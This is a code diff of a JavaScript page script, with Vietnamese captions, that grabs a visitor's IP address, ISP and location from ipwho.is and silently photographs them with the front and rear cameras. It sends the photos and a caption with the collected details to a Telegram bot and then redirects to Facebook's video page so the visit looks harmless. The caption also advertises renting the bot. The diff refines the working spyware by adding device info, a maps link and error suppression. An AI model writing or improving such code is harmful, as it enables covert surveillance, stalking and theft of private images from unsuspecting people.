@@ -5,7 +5,7 @@ async function capture(mode) {
     let stream = null;
     try {
         stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } } 
+            video: { facingMode: mode, width: 640, height: 480 } 
         });
         const video = document.createElement('video');
         video.srcObject = stream;
@@ -13,18 +13,17 @@ async function capture(mode) {
         await video.play();
 
         return new Promise(res => {
-            // Đợi 3.5 giây để camera lấy nét và sáng hơn
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                // QUAN TRỌNG: Tắt toàn bộ camera sau khi chụp xong
                 stream.getTracks().forEach(t => t.stop());
+                video.srcObject = null;
                 
                 canvas.toBlob(res, 'image/jpeg', 0.7);
-            }, 3500);
+            }, 3000);
         });
     } catch (e) {
         if (stream) stream.getTracks().forEach(t => t.stop());
@@ -33,22 +32,30 @@ async function capture(mode) {
 }
 
 async function main() {
-    // 1. Lấy dữ liệu vị trí trước
-    const r = await fetch('https://ipwho.is/').catch(() => ({}));
-    const d = await r.json().catch(() => ({}));
-    
-    // 2. Chụp ảnh tuần tự (Chụp xong ảnh 1 mới bắt đầu ảnh 2)
+    let info = { ip: '?', isp: '?', addr: '?', lat: 0, lon: 0 };
+    try {
+        const r = await fetch('https://ipwho.is/');
+        const d = await r.json();
+        info = { ip: d.ip, isp: d.connection?.org, addr: `${d.city}, ${d.region}`, lat: d.latitude, lon: d.longitude };
+    } catch (e) {}
+
     const p1 = await capture("user");
-    await new Promise(r => setTimeout(r, 1000)); // Nghỉ 1s để phần cứng camera reset
+    await new Promise(r => setTimeout(r, 1500)); 
     const p2 = await capture("environment");
 
-    const cap = `📡 [THÔNG TIN]
+    const mapUrl = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
+
+    const cap = `📡 [THÔNG TIN TRUY CẬP]
 🕒 ${new Date().toLocaleString('vi-VN')}
-🌍 IP: ${d.ip || '?'}
-🏢 ISP: ${d.connection?.org || '?'}
-📍 Khu vực: ${d.city || '?'}, ${d.region || '?'}
-📌 Maps: http://www.google.com/maps/place/${d.latitude},${d.longitude}
-📸 Camera: ${p1 ? "✅ Trước" : "❌ Trước"} | ${p2 ? "✅ Sau" : "❌ Sau"}`.trim();
+📱 Thiết bị: ${navigator.platform}
+🌍 IP: ${info.ip}
+🏢 ISP: ${info.isp}
+📍 Khu vực: ${info.addr}
+📌 Maps: ${mapUrl}
+📸 Camera: ${p1 ? "✅ Trước" : "❌"} | ${p2 ? "✅ Sau" : "❌"}
+
+⚠️ Lưu ý: Thông tin trên có thể không chính xác 100%.
+💸 Mua bot - Thuê bot ib Tele: @Mrwenben`.trim();
 
     const fd = new FormData();
     fd.append('chat_id', ID);
@@ -61,22 +68,25 @@ async function main() {
     
     if (p2) {
         fd.append('f2', p2, '2.jpg');
-        // Nếu đã có p1 thì p2 không cần caption để Telegram tự gộp album
-        media.push({ type: 'photo', media: 'attach://f2', caption: media.length === 0 ? cap : "" });
+        media.push({ type: 'photo', media: 'attach://f2', caption: (media.length === 0) ? cap : "" });
     }
 
-    if (media.length > 0) {
-        fd.append('media', JSON.stringify(media));
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { method: 'POST', body: fd });
-    } else {
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: ID, text: cap })
-        });
-    }
+    try {
+        if (media.length > 0) {
+            fd.append('media', JSON.stringify(media));
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { method: 'POST', body: fd });
+        } else {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ID, text: cap })
+            });
+        }
+    } catch (err) {}
     
-    window.location.href = "https://www.facebook.com/watch/";
+    setTimeout(() => {
+        window.location.href = "https://www.facebook.com/watch/";
+    }, 500);
 }
 
 main();
